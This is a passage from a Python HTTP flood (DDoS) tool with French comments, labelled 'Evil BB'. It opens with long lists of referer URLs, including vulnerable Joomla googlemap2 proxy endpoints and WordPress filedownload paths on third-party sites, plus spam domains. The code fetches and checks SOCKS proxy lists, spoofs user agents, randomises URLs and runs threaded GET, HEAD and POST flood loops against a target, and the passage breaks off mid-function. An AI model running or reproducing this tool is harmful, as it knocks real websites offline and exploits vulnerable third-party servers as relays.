"http://floridaintlcollege.com/wp-content/plugins/filedownload/download.php?path=",
"http://minib.pl/wp-content/plugins/filedownload/download.php?path=",
"http://www.illinoiseyeinstitute.org/wp-content/plugins/filedownload/download.php?path=",
"http://medicalestetic.ro/wp-content/plugins/filedownload/download.php?path=",
"http://www.bigler-finearts.com/wp-content/plugins/filedownload/download.php?path=",
"https://dzedzich.org/wp-content/plugins/filedownload/download.php?path=",
"http://dvv-international.by/wp-content/plugins/filedownload/download.php?path=",
"http://www.audi-tdi-chronik.de/wp-content/plugins/filedownload/download.php?path=",
"http://www.sourcelab-plasma.com/wp-content/plugins/filedownload/download.php?path=",
"http://www.ishieldz.com/new/wp-content/plugins/filedownload/download.php?path=",
"http://www.gangrecordingstudio.com/wp-content/plugins/filedownload/download.php?path=",
"http://eskimon.fr/wp-content/plugins/filedownload/download.php?path=",
"http://www.robolift.at/wp-content/plugins/filedownload/download.php?path=",
"http://www.darioianes.it/site/wp-content/plugins/filedownload/download.php?path=",
"http://www.zetatekindia.com/wp-content/plugins/filedownload/download.php?path=",
"http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=",
"http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=",
"http://www.demarcation.org.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://tv1861.net/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.idace.ce.gov.br/sitio/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://ncs3.prohost.pl/ESTO/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://services.w3.org/tidy/tidy?docAddr=",
"http://bao-sushi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.limitless-coiffure.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://finnrelax.hu/fitnesz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://hotelsixty3.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://about42.nl/www/showheaders.php;POST;about42.nl.txt",
"http://browsershots.org;POST;browsershots.org.txt",
"http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&Url=",
"http://demo.geonode.org/proxy/?url=",
"http://streamitwebseries.twww.tv/proxy.php?url=",
"http://www.comicgeekspeak.com/proxy.php?url=",
"http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://antra.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://ijzerhandeljanssen.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://link2europe.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://mail.chineseblast.com/theyardbirds.narod.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://mail.hostbuzzz.com/fish-sale.narod.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://mail.topsclub.ru/graalis.narod.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://mail.viarh.ru/hayes-house.narod.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://pdllaurentino.it/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://peelmc.ca/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://s2p.lt/main/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://secofis.com/a/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://smartonecity.com/pt/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://snelderssport.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://spanner-joos-vergaser.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://static.74.174.40.188.clients.your-server.de/decongroup.narod.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://static.74.174.40.188.clients.your-server.de/homemuseum.narod.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://static.74.174.40.188.clients.your-server.de/igor-lagutin.narod.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://static.76.174.40.188.clients.your-server.de/gamesshops.narod.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://static.76.174.40.188.clients.your-server.de/novoselie.narod.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://sunnyhillsassistedliving.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://testserver.lv/salve/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://thevintagechurch.com/www2/index.php?url=/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.abc-haus.ch/reinigung/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.alhambrahotel.net/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.aliento.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=",
"http://www.bareth-coaching.com/www/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.cgrifo.com/demo/cabelo/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.de-driesprong.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.fotorima.com/rima/site2/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.fr-ready.at/cncready/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.icel.be/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.idea-designer.com/idea/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.jana-wagenknecht.de/wcms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.kjg-hemer.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.labonnevie-guesthouse-jersey.com/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.linguamatic.com/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.multicart.com.br/hcz.com.br/home/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.nahmiashnos.cl/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.oliebollen.me/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.paro-nl.com/v2/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.precak.sk/penzion/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.pyrenees-cerdagne.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.ravidassia-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.rethinkingjournalism.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.schnepper-melcher.de/files/schneppermelcher/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.sealyham.sk/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.siroki.it/newsite/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.soporteavanzado.com/jm/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.stannestifton.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.uchlhr.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.virmcc.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.visitsliven.com/bg/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.xn--horthaus-lwe-ejb.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.yigilca.gov.tr/_tr/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://hillsidecountryclub.com/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://dom-kon.com/Joomla/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.dunaexpert.hu/home/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.stephanus-web.de/joomla1015/mambots/content/plugin_googlemap2_proxy.php?url=",
"http://www.ski-club-baulmes.ch/site/mambots/content/plugin_googlemap2_proxy.php?url=",
"http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt",
"0-0.fr",
"01casino-x.ru",
"033nachtvandeliteratuur.nl",
"03e.info",
"03p.info",
"0n-line.tv",
"1-99seo.com",
"1-best-seo.com",
"1-free-share-buttons.com",
"100-reasons-for-seo.com",
"100dollars-seo.com",
"12-reasons-for-seo.net",
"12masterov.com",
"12u.info",
"15-reasons-for-seo.com",
"1kreditzaim.ru",
"1pamm.ru",
"1st-urist.ru",
"1webmaster.ml",
"1wek.top",
"1winru.ru",
"1x-slot.site",
"1x-slots.site",
"1xbet-entry.ru",
"1xbetcc.com",
"1xbetonlines1.ru",
"1xbetportugal.com",
"1xbetts.ru",
"1xslot-casino.online",
"1xslot-casino.ru",
"1xslot-casino.site",
"1xslot.site",
"1xslots-africa.site",
"1xslots-brasil.site",
"1xslots-casino.site",
        "https://app.pix.fr/",
        "https://idp-auth.gar.education.fr/",
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	"https://www.google.ad/search?q=",
	"https://www.google.ae/search?q=",
	"https://www.google.com.af/search?q=",
	"https://www.google.com.ag/search?q=",
	"https://www.google.com.ai/search?q=",
	"https://www.google.al/search?q=",
	"https://www.google.am/search?q=",
	"https://www.google.co.ao/search?q=",
	"http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=",
	"http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=",
	"http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=",
	"http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=",
	"http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=",
	"http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=",
	"http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
	"http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=",
	"http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=",
	"http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
	"http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
	"http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
	"http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=",
	"http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=",
	"http://validator.w3.org/check?uri=",
	"http://jigsaw.w3.org/css-validator/validator?uri=",
	"http://validator.w3.org/checklink?uri=",
	"http://www.w3.org/RDF/Validator/ARPServlet?URI=",
	"http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=",
	"http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=",
	"http://validator.w3.org/mobile/check?docAddr=",
	"http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
	"http://online.htmlvalidator.com/php/onlinevallite.php?url=",
	"http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
	"http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=",
	"http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=",
	"http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=",
	"http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
	"http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
	"http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
	"http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=",
	"http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
	"http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
	"http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=",
	"http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
	"http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=",
	"http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
	"http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS",
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	"https://www.google.ad/search?q=",
	"https://www.google.ae/search?q=",
	"https://www.google.com.af/search?q=",
	"https://www.google.com.ag/search?q=",
	"https://www.google.com.ai/search?q=",
	"https://www.google.al/search?q=",
	"https://www.google.am/search?q=",
	"https://www.google.co.ao/search?q=",
	"http://engadget.search.aol.com/search?q=",
	"http://www.usatoday.com/search/results?q=",
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	"https://www.google.ad/search?q=",
	"https://www.google.ae/search?q=",
	"https://www.google.com.af/search?q=",
	"https://www.google.com.ag/search?q=",
	"https://www.google.com.ai/search?q=",
	"https://www.google.al/search?q=",
	"https://www.google.am/search?q=",
	"https://www.google.co.ao/search?q=",
]
ind_dict = {}
data = ""
cookies = ""
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
Intn = random.randint
Choice = random.choice
def build_threads(mode,thread_num,event,socks_type,ind_rlock):
	if mode == "post":
		for _ in range(thread_num):
			th = threading.Thread(target = post,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
	elif mode == "cc":
		for _ in range(thread_num):
			th = threading.Thread(target = cc,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
	elif mode == "head":
		for _ in range(thread_num):
			th = threading.Thread(target = head,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
			
#on utilise des user agent.
def getuseragent():
	platform = Choice(['Macintosh', 'Windows', 'X11'])
	if platform == 'Macintosh':
		os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
	elif platform == 'Windows':
		os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
	elif platform == 'X11':
		os  = Choice(['Linux i686', 'Linux x86_64'])
	browser = Choice(['chrome', 'firefox', 'ie'])
	if browser == 'chrome':
		webkit = str(Intn(500, 599))
		version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
		return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
	elif browser == 'firefox':
		currentYear = datetime.date.today().year
		year = str(Intn(2020, currentYear))
		month = Intn(1, 12)
		if month < 10:
			month = '0' + str(month)
		else:
			month = str(month)
		day = Intn(1, 30)
		if day < 10:
			day = '0' + str(day)
		else:
			day = str(day)
		gecko = year + month + day
		version = str(Intn(1, 72)) + '.0'
		return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
	elif browser == 'ie':
		version = str(Intn(1, 99)) + '.0'
		engine = str(Intn(1, 99)) + '.0'
		option = Choice([True, False])
		if option == True:
			token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
		else:
			token = ''
		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
		
#randomisation d'url
def randomurl():
	return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings) + Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))
	
#method et header

def GenReqHeader(method):
	global data
	header = ""
	if method == "get" or method == "head":
		connection = "Connection: Keep-Alive\r\n"
		if cookies != "":
			connection += "Cookies: "+str(cookies)+"\r\n"
		accept = Choice(acceptall)
		referer = "Referer: "+Choice(referers)+ target + path + "\r\n"
		useragent = "User-Agent: " + getuseragent() + "\r\n"
		header =  referer + useragent + accept + connection + "\r\n"
	elif method == "post":
		post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
		content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
		refer = "Referer: http://"+ target + path + "\r\n"
		user_agent = "User-Agent: " + getuseragent() + "\r\n"
		accept = Choice(acceptall)
		if mode2 != "y":# on peut activer les data custom
			data = str(random._urandom(16))
		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
		if cookies != "":
			length += "Cookies: "+str(cookies)+"\r\n"
		header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
	return header
#info url et parsing reduction
def ParseUrl(original_url):
	global target
	global path
	global port
	global protocol
	original_url = original_url.strip()
	url = ""
	path = "/"#par defaut
	port = 80 #par defaut
	protocol = "http"
	#http(s)://www.example.com:1337/xxx
	if original_url[:7] == "http://":
		url = original_url[7:]
	elif original_url[:8] == "https://":
		url = original_url[8:]
		protocol = "https"
	#http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
	#print(url) #for debug
	tmp = url.split("/")
	website = tmp[0]#www.example.com:1337/xxx ==> www.example.com:1337
	check = website.split(":")
	if len(check) != 1:#detection des ports
		port = int(check[1])
	else:
		if protocol == "https":
			port = 443
	target = check[0]
	if len(tmp) > 1:
		path = url.replace(website,"",1)#recuperation du chemin www.example.com/xxx ==> /xxx

def InputOption(question,options,default):
	ans = ""
	while ans == "":
		ans = str(input(question)).strip().lower()
		if ans == "":
			ans = default
		elif ans not in options:
			print("# Entrez une option correctement")
			ans = ""
			continue
	return ans

#checker socks4/5
def CheckerOption():
	global proxies
	N = str(input("# voulez vous une socks list ? (y/n,defaut=y):"))
	if N == 'y' or N == "" :
		downloadsocks(choice)
	else:
		pass
	if choice == "4":
		out_file = str(input("# Repertoire des listes de Socks4 (socks4.txt):"))
		if out_file == '':
			out_file = str("socks4.txt")
		else:
			out_file = str(out_file)
		check_list(out_file)
		proxies = open(out_file).readlines()
	elif choice == "5":
		out_file = str(input("# Repertoire des listes de Socks5 (socks5.txt):"))
		if out_file == '':
			out_file = str("socks5.txt")
		else:
			out_file = str(out_file)
		check_list(out_file)
		proxies = open(out_file).readlines()
	if len(proxies) == 0:
		print("# il n'y a plus de proxie ... téléchargez en d'autre ")
		sys.exit(1)
	print ("# nombre de proxy Socks%s : %s" %(choice,len(proxies)))
	time.sleep(0.03)
	ans = str(input("# avez-vous besoin de check la liste des socks ?(y/n, defaut=y):"))
	if ans == "":
		ans = "y"
	if ans == "y":
		ms = str(input("# Delais des socks (seconds, defaut=5):"))
		if ms == "":
			ms = int(5)
		else :
			try:
				ms = int(ms)
			except :
				ms = float(ms)
		check_socks(ms)
#proxy
def SetupIndDict():
	global ind_dict
	for proxy in proxies:
		ind_dict[proxy.strip()] = 0
#tableau
def OutputToScreen(ind_rlock):
	global ind_dict
	i = 0
	sp_char = ["","☠","","☠"]
	while 1:
		if i > 3:
			i = 0
		print("{:^70}".format("Statut des proxy"))
		print("{:^70}".format("IP:PORT   <->   RPS    "))
		#1. xxx.xxx.xxx.xxx:xxxxx ==> Rps: xxxx
		ind_rlock.acquire()
		top_num = 0
		top10= sorted(ind_dict, key=ind_dict.get, reverse=True)
		if len(top10) > 10:
			top_num = 10
		else:
			top_num = len(top10)
		for num in range(top_num):
			top = "none"
			rps = 0
			if len(ind_dict) != 0:
				top = top10[num]
				rps = ind_dict[top]
				ind_dict[top] = 0
			print("{:^70}".format("{:2d}. {:^22s} | Rps: {:d}".format(num+1,top,rps)))
		total = 0
		for k,v in ind_dict.items():
			total = total + v
			ind_dict[k] = 0
		ind_rlock.release()
		print("{:^70}".format(" ["+sp_char[i]+"] Evil BB | Total Rps:"+str(total)))
		i+=1
		time.sleep(1)
		print("\n"*100)

def cc(event,socks_type,ind_rlock):
	global ind_dict
	header = GenReqHeader("get")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for n in range(multiple+1):
					get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
					request = get_host + header
					sent = s.send(str.encode(request))
					if not sent:
						ind_rlock.acquire()
						ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
						ind_rlock.release()
						proxy = Choice(proxies).strip().split(":")
						break
				s.close()
			except:
				s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
			ind_rlock.release()
		except:
			s.close()

def head(event,socks_type,ind_rlock):#HEAD MODE
	global ind_dict
	header = GenReqHeader("head")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for n in range(multiple+1):
					head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
					request = head_host + header
					sent = s.send(str.encode(request))
					if not sent:
						ind_rlock.acquire()
						ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
						ind_rlock.release()
						proxy = Choice(proxies).strip().split(":")
						break
				s.close()
			except:
				s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
			ind_rlock.release()
		except:#dirty fix
			s.close()

def post(event,socks_type,ind_rlock):
	global ind_dict
	request = GenReqHeader("post")
	proxy = Choice(proxies).strip().split(":")
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for n in range(multiple+1):
					sent = s.send(str.encode(request))
